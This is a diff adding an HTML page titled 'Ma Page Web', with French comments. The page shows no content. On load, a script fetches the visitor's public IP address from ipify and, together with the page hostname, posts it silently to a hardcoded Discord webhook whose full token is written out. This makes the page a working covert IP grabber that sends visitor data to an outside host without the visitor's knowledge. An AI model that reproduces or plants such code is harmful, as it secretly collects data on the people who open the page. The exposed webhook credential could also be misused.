@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ma Page Web</title>
+</head>
+<body onload="monScript()">
+    <script>
+        function monScript() {
+            // Importer les bibliothèques nécessaires si nécessaire (par exemple, pour faire des requêtes HTTP en JavaScript)
+            // const fetch = require('node-fetch');
+            
+            async function getLocalIP() {
+                try {
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    const localIP = data.ip;
+                    return localIP;
+                } catch (error) {
+                    console.error("Erreur lors de la récupération de l'adresse IP locale :", error);
+                    return null;
+                }
+            }
+            
+            async function sendIPAndHostnameToDiscord(ip, hostname) {
+                const webhookUrl = 'https://discordapp.com/api/webhooks/1152706838370975864/o2T5XYoTr3Ax_b757vIftU4e8AtlyRlUfYI9e8JHAv5kBti5ERRVyggq7nWSJ_a6LhYl'; // Remplacez par votre URL de webhook Discord
+                const data = {
+                    content: `Mon adresse IP locale est : ${ip}\nNom de la Machine : ${hostname}`,
+                };
+            
+                try {
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data),
+                    });
+            
+                    if (response.status === 204) {
+                        console.log("Adresse IP locale et nom de la machine envoyés avec succès à Discord.");
+                    } else {
+                        console.error("Erreur lors de l'envoi de l'adresse IP locale à Discord :", response.status);
+                    }
+                } catch (error) {
+                    console.error("Erreur lors de l'envoi de l'adresse IP locale à Discord :", error);
+                }
+            }
+            
+            async function main() {
+                const localIP = await getLocalIP();
+                const hostname = window.location.hostname; // Obtenez le nom de la machine du navigateur
+            
+                if (localIP) {
+                    sendIPAndHostnameToDiscord(localIP, hostname);
+                }
+            }
+            
+            main();
+        }
+    </script>
+</body>
+</html>
